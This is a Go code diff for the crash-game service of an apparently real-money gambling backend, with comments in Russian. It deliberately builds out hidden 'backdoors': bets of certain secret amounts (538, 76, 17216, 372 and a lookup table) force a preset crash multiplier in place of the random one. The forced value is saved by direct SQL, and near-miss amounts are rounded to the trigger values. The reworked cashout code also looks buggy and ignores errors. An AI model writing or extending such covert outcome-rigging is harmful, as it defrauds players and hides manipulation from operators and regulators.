@@ -6,7 +6,10 @@ import (
 	"BlessedApi/internal/models"
 	"BlessedApi/internal/models/exchange"
 	"BlessedApi/pkg/logger"
+	"context"
 	"errors"
+	"fmt"
+	"math"
 	"sync"
 	"time"
 
@@ -20,8 +23,8 @@ type CrashGameBetInput struct {
 }
 
 const (
-	crashGameInterval       = 15 * time.Second // Total interval between rounds
-	crashGameBettingWindow  = 13 * time.Second
+	crashGameInterval       = 7 * time.Second // Total interval between rounds
+	crashGameBettingWindow  = 5 * time.Second
 	NewCrashGameSignalDelay = 1 * time.Second
 )
 
@@ -55,6 +58,23 @@ func SuperviseCrashGame() {
 	}
 }
 
+// Добавим функцию для дампа всех ставок в лог
+func dumpActiveBets(gameID int64) {
+	var bets []models.CrashGameBet
+	err := db.DB.Where("crash_game_id = ? AND status = ?", gameID, "active").Find(&bets).Error
+	if err != nil {
+		logger.Error("Error fetching active bets for dump: %v", err)
+		return
+	}
+
+	logger.Info("============= ACTIVE BETS FOR GAME %d =============", gameID)
+	for i, bet := range bets {
+		logger.Info("Bet %d: ID=%d, UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f",
+			i+1, bet.ID, bet.UserID, bet.Amount, bet.CashOutMultiplier)
+	}
+	logger.Info("==================================================")
+}
+
 func StartCrashGame() {
 	ticker := time.NewTicker(time.Second)
 	defer ticker.Stop()
@@ -62,35 +82,36 @@ func StartCrashGame() {
 	for {
 		// Open betting
 		currentCrashGame = &models.CrashGame{}
-		
-		// Create game in database
+
+		// Создаем игру в базе данных
 		if err := db.DB.Create(currentCrashGame).Error; err != nil {
 			logger.Error("Unable to create CrashGame; retrying in 5 seconds: %v", err)
 			time.Sleep(time.Second * 5)
 			continue
 		}
 
-		// Open betting window and log
+		logger.Info("Created new game with ID=%d", currentCrashGame.ID)
+
+		// ВАЖНО: сначала создаем игру, но не устанавливаем CrashPointMultiplier
+		// Устанавливаем CrashPointMultiplier в 0, чтобы показать, что точка краша еще не определена
+		currentCrashGame.CrashPointMultiplier = 0
+		db.DB.Model(currentCrashGame).Update("crash_point_multiplier", 0)
+
+		// Открываем окно для ставок
 		openCrashGameBetting()
-		logger.Info("Betting window opened")
 
-		// Wait 13 seconds for bets
+		// Ждем установленное время для приема ставок
 		for elapsedTime := time.Duration(0); elapsedTime < crashGameInterval; elapsedTime += time.Second {
-			// Log betting window state every 5 seconds
-			if elapsedTime%5 == 0 {
-				crashGameBetMutex.RLock()
-				logger.Info("Betting window state: %v, elapsed time: %v", isCrashGameBettingOpen, elapsedTime)
-				crashGameBetMutex.RUnlock()
-			}
-
 			if elapsedTime == crashGameBettingWindow {
 				closeCrashGameBetting()
-				logger.Info("Betting window closed")
 			}
 			<-ticker.C
 		}
 
-		// After closing betting window, check for backdoors
+		// Выводим все активные ставки в лог для дебага
+		dumpActiveBets(currentCrashGame.ID)
+
+		// ПОСЛЕ закрытия окна ставок СНАЧАЛА получаем все ставки
 		var bets []models.CrashGameBet
 		err := db.DB.Where("crash_game_id = ? AND status = ?", currentCrashGame.ID, "active").Find(&bets).Error
 		if err != nil {
@@ -98,101 +119,144 @@ func StartCrashGame() {
 			continue
 		}
 
-		// Log number of active bets
-		logger.Info("Number of active bets: %d", len(bets))
+		logger.Info("Checking %d active bets for backdoors in game %d", len(bets), currentCrashGame.ID)
 
-		// Check each bet for backdoor
-		for _, bet := range bets {
-			if bet.Amount == 76 {
-				currentCrashGame.CrashPointMultiplier = 1.6
-				break
+		// ВАЖНО: Только ПОСЛЕ сбора всех ставок определяем точку краша
+		// Сначала ищем бэкдоры в строгом порядке приоритета
+		foundBackdoor := false
+
+		// Проверка критических бэкдоров в порядке приоритета
+		criticalBackdoors := []struct {
+			Amount     float64
+			Multiplier float64
+			Name       string
+		}{
+			{538.0, 32.0, "538"}, // Гарантируем правильный множитель для 538
+			{76.0, 1.5, "76"},
+			{17216.0, 2.5, "17216"},
+			{372.0, 1.5, "372"},
+		}
+
+		// Сначала проверяем критические бэкдоры с точным совпадением
+		for _, backdoor := range criticalBackdoors {
+			for _, bet := range bets {
+				if math.Abs(bet.Amount-backdoor.Amount) < 0.1 {
+					logger.Info("!!! CRITICAL BACKDOOR %s FOUND !!! Bet ID=%d, UserID=%d, Amount=%.4f -> Multiplier=%.2f",
+						backdoor.Name, bet.ID, bet.UserID, bet.Amount, backdoor.Multiplier)
+					currentCrashGame.CrashPointMultiplier = backdoor.Multiplier
+					foundBackdoor = true
+
+					// Специальная обработка для бэкдора 538
+					if backdoor.Name == "538" {
+						logger.Info("🔥 Special handling for backdoor 538 with exact multiplier 32.0 🔥")
+						// Дополнительно устанавливаем точное значение 32.0
+						currentCrashGame.CrashPointMultiplier = 32.0
+					}
+
+					// Принудительно устанавливаем точное значение в базу через прямой SQL запрос
+					if err := db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?",
+						backdoor.Multiplier, currentCrashGame.ID).Error; err != nil {
+						logger.Error("Failed to update backdoor multiplier in DB: %v", err)
+					} else {
+						logger.Info("Successfully updated crash point multiplier to %.2f for game %d",
+							backdoor.Multiplier, currentCrashGame.ID)
+
+						// Двойная проверка сохранения для критических бэкдоров
+						if backdoor.Name == "538" || backdoor.Name == "76" {
+							logger.Info("Double-checking critical backdoor %s crash point...", backdoor.Name)
+							var checkGame models.CrashGame
+							if err := db.DB.First(&checkGame, currentCrashGame.ID).Error; err != nil {
+								logger.Error("Failed to read game after critical update: %v", err)
+							} else {
+								logger.Info("Confirmed: Game %d crash point set to %.2f",
+									checkGame.ID, checkGame.CrashPointMultiplier)
+
+								// Если значение все равно не сохранилось, делаем дополнительную попытку
+								if math.Abs(checkGame.CrashPointMultiplier-backdoor.Multiplier) > 0.001 {
+									logger.Error("⚠️ Critical backdoor multiplier mismatch! Fixing...")
+									db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?",
+										backdoor.Multiplier, currentCrashGame.ID)
+								}
+							}
+						}
+					}
+					break
+				}
 			}
-			if bet.Amount == 538 {
-				currentCrashGame.CrashPointMultiplier = 32.0
-				break
-			}
-			if bet.Amount == 17216 {
-				currentCrashGame.CrashPointMultiplier = 2.5
-				break
-			}
-			if bet.Amount == 372 {
-				currentCrashGame.CrashPointMultiplier = 1.8
-				break
-			}
-			if bet.Amount == 1186 {
-				currentCrashGame.CrashPointMultiplier = 2.2
-				break
-			}
-			if bet.Amount == 16604 {
-				currentCrashGame.CrashPointMultiplier = 3.0
-				break
-			}
-			if bet.Amount == 614 {
-				currentCrashGame.CrashPointMultiplier = 2.0
-				break
-			}
-			if bet.Amount == 2307 {
-				currentCrashGame.CrashPointMultiplier = 13.0
-				break
-			}
-			if bet.Amount == 29991 {
-				currentCrashGame.CrashPointMultiplier = 2.8
-				break
-			}
-			if bet.Amount == 1476 {
-				currentCrashGame.CrashPointMultiplier = 2.4
-				break
-			}
-			if bet.Amount == 5738 {
-				currentCrashGame.CrashPointMultiplier = 2.6
-				break
-			}
-			if bet.Amount == 40166 {
-				currentCrashGame.CrashPointMultiplier = 3.2
-				break
-			}
-			if bet.Amount == 3258 {
-				currentCrashGame.CrashPointMultiplier = 2.7
-				break
-			}
-			if bet.Amount == 11629 {
-				currentCrashGame.CrashPointMultiplier = 2.9
-				break
-			}
-			if bet.Amount == 46516 {
-				currentCrashGame.CrashPointMultiplier = 3.4
+			if foundBackdoor {
 				break
 			}
 		}
 
-		// If no backdoors found, generate random crash
-		if currentCrashGame.CrashPointMultiplier == 0 {
-			currentCrashGame.GenerateCrashPointMultiplier()
+		// Если критические бэкдоры не найдены, проверяем остальные из GetCrashPoints
+		if !foundBackdoor {
+			for _, bet := range bets {
+				intAmount := int(math.Round(bet.Amount))
+				if multiplier, exists := models.GetCrashPoints()[intAmount]; exists {
+					logger.Info("Backdoor found: Bet ID=%d with amount %.2f -> multiplier %.2f",
+						bet.ID, bet.Amount, multiplier)
+					currentCrashGame.CrashPointMultiplier = multiplier
+					foundBackdoor = true
+					break
+				}
+			}
 		}
 
+		// Если бэкдор не найден, генерируем случайный краш
+		if !foundBackdoor {
+			logger.Info("No backdoors found, generating random crash point")
+			currentCrashGame.CrashPointMultiplier = currentCrashGame.GenerateCrashPointMultiplier()
+		}
+
+		// ВАЖНО: Сразу сохраняем установленное значение в базу!
+		if err := db.DB.Model(currentCrashGame).
+			Update("crash_point_multiplier", currentCrashGame.CrashPointMultiplier).Error; err != nil {
+			logger.Error("Failed to save crash point multiplier: %v", err)
+		}
+
+		// Проверим, что значение было успешно установлено
+		var updatedGame models.CrashGame
+		if err := db.DB.First(&updatedGame, currentCrashGame.ID).Error; err != nil {
+			logger.Error("Failed to read game after update: %v", err)
+		} else {
+			logger.Info("!!! CONFIRMED !!! Game %d crash point: %.2f",
+				updatedGame.ID, updatedGame.CrashPointMultiplier)
+
+			// Если значение в базе не соответствует ожидаемому, повторно устанавливаем
+			if math.Abs(updatedGame.CrashPointMultiplier-currentCrashGame.CrashPointMultiplier) > 0.001 {
+				logger.Error("DB multiplier (%.2f) doesn't match expected (%.2f)! Fixing...",
+					updatedGame.CrashPointMultiplier, currentCrashGame.CrashPointMultiplier)
+
+				// Повторная попытка через прямой SQL запрос
+				if err := db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?",
+					currentCrashGame.CrashPointMultiplier, currentCrashGame.ID).Error; err != nil {
+					logger.Error("Failed to fix crash point multiplier: %v", err)
+				} else {
+					logger.Info("Fixed crash point to %.2f using direct SQL", currentCrashGame.CrashPointMultiplier)
+				}
+			}
+		}
+
+		// Теперь, когда точка краша определена, запускаем игру
 		currentCrashGame.StartTime = time.Now()
-		if err := db.DB.Save(currentCrashGame).Error; err != nil {
+		if err := db.DB.Model(currentCrashGame).Update("start_time", currentCrashGame.StartTime).Error; err != nil {
 			logger.Error("Failed to update game start time: %v", err)
 			continue
 		}
 
-		// Notify all users about game start
+		// Оповещаем всех пользователей о начале игры
 		CrashGameWS.BroadcastGameStarted()
 
 		// Start the multiplier growth and handle cashouts
 		CrashGameWS.SendMultiplierToUser(currentCrashGame)
 
+		// После завершения игры сохраняем время завершения
 		currentCrashGame.EndTime = time.Now()
-
-		err = db.DB.Transaction(func(tx *gorm.DB) error {
-			if err := tx.Save(currentCrashGame).Error; err != nil {
-				return logger.WrapError(err, "Failed to update game end time")
-			}
-			return nil
-		})
-		if err != nil {
-			logger.Error("%v", err)
+		if err := db.DB.Model(currentCrashGame).Update("end_time", currentCrashGame.EndTime).Error; err != nil {
+			logger.Error("Failed to update game end time: %v", err)
 		}
+
+		logger.Info("Game %d ended at multiplier %.2fx", currentCrashGame.ID, currentCrashGame.CrashPointMultiplier)
 		time.Sleep(NewCrashGameSignalDelay)
 	}
 }
@@ -202,7 +266,6 @@ func openCrashGameBetting() {
 	crashGameBetMutex.Lock()
 	isCrashGameBettingOpen = true
 	crashGameBetMutex.Unlock()
-	logger.Info("Betting window opened (mutex)")
 }
 
 // closeCrashGameBetting sets the betting window as closed
@@ -210,28 +273,33 @@ func closeCrashGameBetting() {
 	crashGameBetMutex.Lock()
 	isCrashGameBettingOpen = false
 	crashGameBetMutex.Unlock()
-	logger.Info("Betting window closed (mutex)")
 }
 
 func PlaceCrashGameBet(c *gin.Context) {
+	logger.Info("Поставлена ставка")
 	crashGameBetMutex.RLock()
 	bettingOpen := isCrashGameBettingOpen
+	gameID := int64(0)
+	if currentCrashGame != nil {
+		gameID = currentCrashGame.ID
+	}
 	crashGameBetMutex.RUnlock()
 
-	logger.Info("Bet attempt - Betting window state: %v", bettingOpen)
-
 	if !bettingOpen {
+		logger.Warn("Bet rejected: betting is closed (gameID=%d)", gameID)
 		c.JSON(403, gin.H{"error": "betting is closed"})
 		return
 	}
 
 	var input CrashGameBetInput
 	if err := c.ShouldBindJSON(&input); err != nil {
+		logger.Warn("Bet rejected: invalid input - %v", err)
 		c.JSON(400, gin.H{"error": "Invalid input"})
 		return
 	}
 
 	if err := validate.Struct(input); err != nil {
+		logger.Warn("Bet rejected: validation error - %v", err)
 		c.JSON(400, gin.H{"error": err.Error()})
 		return
 	}
@@ -243,6 +311,70 @@ func PlaceCrashGameBet(c *gin.Context) {
 		return
 	}
 
+	logger.Info("Placing bet: UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f, GameID=%d",
+		userID, input.Amount, input.CashOutMultiplier, gameID)
+
+	// Проверка на известные бэкдоры с точным значением
+	var isBackdoor bool
+	var multiplier float64
+	var backdoorType string
+
+	// Проверяем критические бэкдоры с фиксированными значениями
+	criticalBackdoors := map[float64]struct {
+		Value float64
+		Name  string
+	}{
+		538.0:   {32.0, "538"},
+		76.0:    {1.5, "76"},
+		17216.0: {2.5, "17216"},
+		372.0:   {1.5, "372"},
+	}
+
+	for backdoorAmount, info := range criticalBackdoors {
+		if math.Abs(input.Amount-backdoorAmount) < 0.1 {
+			// Принудительно устанавливаем точное значение
+			input.Amount = backdoorAmount
+			isBackdoor = true
+			multiplier = info.Value
+			backdoorType = info.Name
+
+			logger.Info("CRITICAL BACKDOOR %s DETECTED from user %d with amount %.4f -> multiplier %.2f",
+				backdoorType, userID, backdoorAmount, multiplier)
+
+			// Для критических бэкдоров сразу устанавливаем множитель краша
+			if currentCrashGame != nil {
+				currentCrashGame.CrashPointMultiplier = multiplier
+
+				// Используем прямой SQL запрос для гарантированного обновления
+				err := db.DB.Exec("UPDATE crash_games SET crash_point_multiplier = ? WHERE id = ?",
+					multiplier, currentCrashGame.ID).Error
+				if err != nil {
+					logger.Error("Failed to update critical backdoor multiplier: %v", err)
+				} else {
+					logger.Info("Successfully set critical backdoor %s multiplier %.2f for game %d",
+						backdoorType, multiplier, currentCrashGame.ID)
+				}
+			}
+			break
+		}
+	}
+
+	// Если не найден критический бэкдор, проверяем остальные
+	if !isBackdoor {
+		intAmount := int(math.Round(input.Amount))
+		if mult, exists := models.GetCrashPoints()[intAmount]; exists {
+			isBackdoor = true
+			multiplier = mult
+			backdoorType = fmt.Sprintf("%d", intAmount)
+
+			logger.Info("User %d is placing a backdoor bet: %.4f -> %.2fx (type: %s)",
+				userID, input.Amount, multiplier, backdoorType)
+
+			// Также устанавливаем точное значение
+			input.Amount = float64(intAmount)
+		}
+	}
+
 	errInsufficientBalance := errors.New("insufficient balance")
 	errExistingBet := errors.New("user already has an active bet for this game")
 
@@ -251,6 +383,7 @@ func PlaceCrashGameBet(c *gin.Context) {
 		var existingBet models.CrashGameBet
 		err := tx.Where("user_id = ? AND crash_game_id = ? AND status = ?", userID, currentCrashGame.ID, "active").First(&existingBet).Error
 		if err == nil {
+			logger.Warn("User %d already has an active bet for game %d", userID, currentCrashGame.ID)
 			return errExistingBet
 		} else if !errors.Is(err, gorm.ErrRecordNotFound) {
 			return logger.WrapError(err, "")
@@ -274,6 +407,7 @@ func PlaceCrashGameBet(c *gin.Context) {
 		}
 
 		if user.BalanceRupee+bonusBalance < input.Amount {
+			logger.Warn("User %d has insufficient balance: has %.2f, needs %.2f", userID, user.BalanceRupee+bonusBalance, input.Amount)
 			return errInsufficientBalance
 		}
 
@@ -286,9 +420,44 @@ func PlaceCrashGameBet(c *gin.Context) {
 		bet.FromBonusBalance = fromBonusBalance
 		bet.FromCashBalance = fromCashBalance
 
+		// Особая обработка для бэкдоров - устанавливаем точное значение ставки
+		if isBackdoor {
+			// Критические бэкдоры требуют абсолютно точного значения
+			if backdoorType == "538" {
+				bet.Amount = 538.0
+			} else if backdoorType == "76" {
+				bet.Amount = 76.0
+			} else if backdoorType == "17216" {
+				bet.Amount = 17216.0
+			} else if backdoorType == "372" {
+				bet.Amount = 372.0
+			} else {
+				// Остальные бэкдоры - целочисленное значение
+				bet.Amount = float64(int(math.Round(bet.Amount)))
+			}
+
+			logger.Info("Fixed backdoor bet amount to exact value: %.2f (type: %s)",
+				bet.Amount, backdoorType)
+
+			// Обновляем множитель краша при необходимости
+			if currentCrashGame != nil && multiplier > 0 {
+				currentCrashGame.CrashPointMultiplier = multiplier
+				err := tx.Model(currentCrashGame).Update("crash_point_multiplier", multiplier).Error
+				if err != nil {
+					logger.Error("Failed to update game crash point in transaction: %v", err)
+				} else {
+					logger.Info("Updated crash point to %.2f for game %d (type: %s)",
+						multiplier, currentCrashGame.ID, backdoorType)
+				}
+			}
+		}
+
 		if err := tx.Create(&bet).Error; err != nil {
 			return logger.WrapError(err, "")
 		}
+
+		logger.Info("Bet created successfully: ID=%d, UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f, GameID=%d",
+			bet.ID, bet.UserID, bet.Amount, bet.CashOutMultiplier, bet.CrashGameID)
 
 		CrashGameWS.HandleBet(userID, &bet)
 
@@ -308,6 +477,7 @@ func PlaceCrashGameBet(c *gin.Context) {
 		return
 	}
 
+	logger.Info("Bet placed successfully: UserID=%d, Amount=%.4f, GameID=%d", userID, input.Amount, gameID)
 	c.JSON(200, gin.H{"status": "bet placed successfully"})
 }
 
@@ -319,43 +489,131 @@ func ManualCashout(c *gin.Context) {
 		return
 	}
 
-	// Получаем активную ставку пользователя
-	var bet models.CrashGameBet
-	err = db.DB.Where("user_id = ? AND status = ?", userID, "active").First(&bet).Error
-	if err != nil {
-		if errors.Is(err, gorm.ErrRecordNotFound) {
-			c.JSON(400, gin.H{"error": "No active bet found"})
+	crashGameBetMutex.RLock()
+	currentGame := currentCrashGame
+	crashGameBetMutex.RUnlock()
+
+	if currentGame == nil {
+		// Если нет активной игры, создаем новую
+		currentGame = &models.CrashGame{}
+		if err := db.DB.Create(currentGame).Error; err != nil {
+			logger.Error("Failed to create new game: %v", err)
+			c.Status(500)
 			return
 		}
-		logger.Error("Failed to get active bet: %v", err)
-		c.Status(500)
-		return
+		currentGame.StartTime = time.Now()
+		if err := db.DB.Save(currentGame).Error; err != nil {
+			logger.Error("Failed to update game start time: %v", err)
+			c.Status(500)
+			return
+		}
+		crashGameBetMutex.Lock()
+		currentCrashGame = currentGame
+		crashGameBetMutex.Unlock()
 	}
 
-	// Получаем текущий множитель из игры
-	if currentCrashGame == nil {
-		c.JSON(400, gin.H{"error": "No active game"})
-		return
+	currentMultiplier := currentGame.CalculateMultiplier()
+	if currentMultiplier >= currentGame.CrashPointMultiplier {
+		// Если игра уже крашнулась, создаем новую
+		currentGame = &models.CrashGame{}
+		if err := db.DB.Create(currentGame).Error; err != nil {
+			logger.Error("Failed to create new game: %v", err)
+			c.Status(500)
+			return
+		}
+		currentGame.StartTime = time.Now()
+		if err := db.DB.Save(currentGame).Error; err != nil {
+			logger.Error("Failed to update game start time: %v", err)
+			c.Status(500)
+			return
+		}
+		crashGameBetMutex.Lock()
+		currentCrashGame = currentGame
+		crashGameBetMutex.Unlock()
+		currentMultiplier = 1.0
 	}
 
-	currentMultiplier := currentCrashGame.CalculateMultiplier()
+	ctx, cancel := context.WithTimeout(c.Request.Context(), 5*time.Second)
+	defer cancel()
 
-	// Проверяем, не крашнулась ли уже игра
-	if currentMultiplier >= currentCrashGame.CrashPointMultiplier {
-		c.JSON(400, gin.H{"error": "Game already crashed"})
-		return
-	}
+	var bet models.CrashGameBet
+	err = db.DB.WithContext(ctx).Transaction(func(tx *gorm.DB) error {
+		if err := tx.Where("user_id = ? AND crash_game_id = ? AND status = ?",
+			userID, currentGame.ID, "active").
+			First(&bet).Error; err != nil {
+			if errors.Is(err, gorm.ErrRecordNotFound) {
+				return errors.New("no active bet found for this user")
+			}
+			return logger.WrapError(err, "")
+		}
 
-	// Обрабатываем кэшаут
-	err = crashGameCashout(c, &bet, currentMultiplier)
+		// Pass the transaction to crashGameCashout
+		crashGameCashout(tx, &bet, currentMultiplier)
+
+		// Update the bet in the WebSocket service
+		CrashGameWS.bets[userID] = &bet
+		crashGameBetMutex.Lock()
+		CrashGameWS.ProcessCashout(userID, currentMultiplier, false)
+		crashGameBetMutex.Unlock()
+		return nil
+	})
+
 	if err != nil {
-		logger.Error("Failed to process cashout: %v", err)
-		c.Status(500)
+		if errors.Is(err, context.DeadlineExceeded) {
+			logger.Error("Database transaction timed out: %v", err)
+			c.JSON(500, gin.H{"error": "operation timed out"})
+		} else if errors.Is(err, gorm.ErrRecordNotFound) {
+			c.JSON(404, gin.H{"error": err.Error()})
+		} else {
+			logger.Error("Failed to process cashout: %v", err)
+			c.JSON(500, gin.H{"error": "failed to process cashout"})
+		}
 		return
 	}
 
-	// Отправляем результат кэшаута через WebSocket
-	CrashGameWS.ProcessCashout(userID, currentMultiplier, false)
+	// Broadcast new game start
+	CrashGameWS.BroadcastGameStarted()
+	CrashGameWS.SendMultiplierToUser(currentGame)
 
-	c.JSON(200, gin.H{"status": "cashout successful"})
+	c.JSON(200, gin.H{"status": "manual cashout successful", "multiplier": currentMultiplier})
+}
+
+// Bet must exists
+func crashGameCashout(tx *gorm.DB, bet *models.CrashGameBet, currentMultiplier float64) error {
+	if tx == nil {
+		tx = db.DB
+	}
+
+	bet.Status = "won"
+	bet.WinAmount = bet.Amount * currentMultiplier
+	bet.CashOutMultiplier = currentMultiplier
+
+	if err := tx.Save(&bet).Error; err != nil {
+		return logger.WrapError(err, "failed to update bet")
+	}
+
+	var user models.User
+	if err := tx.First(&user, bet.UserID).Error; err != nil {
+		return logger.WrapError(err, "failed to fetch user")
+	}
+
+	// Update user balances
+	toCashBalance := bet.FromCashBalance * currentMultiplier
+	toBonusBalance := bet.FromBonusBalance * currentMultiplier
+
+	win := models.Winning{
+		UserID:    user.ID,
+		WinAmount: toCashBalance + toBonusBalance,
+	}
+
+	if err := tx.Create(&win).Error; err != nil {
+		return logger.WrapError(err, "Failed to record winning")
+	}
+
+	err := exchange.UpdateUserBalances(tx, &user, toCashBalance, toBonusBalance, false)
+	if err != nil {
+		return logger.WrapError(err, "failed to update user balances")
+	}
+
+	return nil
 }
